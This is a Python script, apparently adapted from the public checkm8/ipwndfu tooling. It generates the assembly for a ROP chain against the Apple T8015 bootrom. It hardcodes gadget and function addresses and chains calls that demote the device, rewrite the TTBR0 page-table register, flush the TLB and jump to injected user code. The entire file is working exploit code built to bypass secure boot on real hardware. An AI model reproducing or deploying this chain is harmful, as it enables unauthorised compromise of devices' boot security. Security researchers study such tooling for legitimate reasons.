#!/usr/bin/env python3
#
# https://raw.githubusercontent.com/axi0mX/ipwndfu/master/checkm8.py


class Variables:
    def __init__(self):
        self.dfu_base = 0

        self.insecure_memory_base = 0
        self.dfu_base = 0

        self.func_gadget = 0
        self.ret_gadget = 0
        self.write_ttbr0_fn = 0
        self.tlbi_fn = 0

        self.user_code = 0
        self.demote = 0


# TODO: Support more than just T8015.
vars = Variables()
vars.insecure_memory_base = 0x18000C000
vars.dfu_base = 0x18001C000
vars.func_gadget = 0x10000A9AC
vars.ret_gadget = 0x100000148
vars.write_ttbr0_fn = 0x10000045C
vars.tlbi_fn = 0x1000004AC
vars.user_code = 0x18201C610
vars.demote = 0x100008230


def quad_literal(value: int, nl=True) -> str:
    return f"\t.quad {hex(value)}" + ("\n" if nl else "")


def expand_rop_chain(
    base: int, func_gadget: int, callbacks: list[tuple[int, int]]
) -> str:
    result = ""

    for i in range(0, len(callbacks), 5):
        block1 = ""
        block2 = ""

        for j in range(5):
            base += 0x10

            if j == 4:
                base += 0x50

            if i + j < len(callbacks) - 1:
                block1 += quad_literal(vars.func_gadget)
                block1 += quad_literal(base)
                block2 += quad_literal(callbacks[i + j][1])
                block2 += quad_literal(callbacks[i + j][0])
            elif i + j == len(callbacks) - 1:
                block1 += quad_literal(vars.func_gadget)
                block1 += quad_literal(0)
                block2 += quad_literal(callbacks[i + j][1])
                block2 += quad_literal(callbacks[i + j][0])
            else:
                block1 += quad_literal(0)
                block1 += quad_literal(0)

        result += block1 + block2

    return result


print("\t;; *** Do not edit; see `tools/make_rop.py` to re-generate! ***\n")
[print(quad_literal(0, nl=False)) for _ in range(4)]
print(
    expand_rop_chain(
        vars.dfu_base,
        vars.func_gadget,
        [
            (vars.demote, 0),
            (vars.write_ttbr0_fn, vars.dfu_base),
            (vars.tlbi_fn, 0),
            (vars.user_code, 0),
            (vars.write_ttbr0_fn, vars.insecure_memory_base),
            (vars.tlbi_fn, 0),
            (vars.ret_gadget, 0),
        ],
    )
)
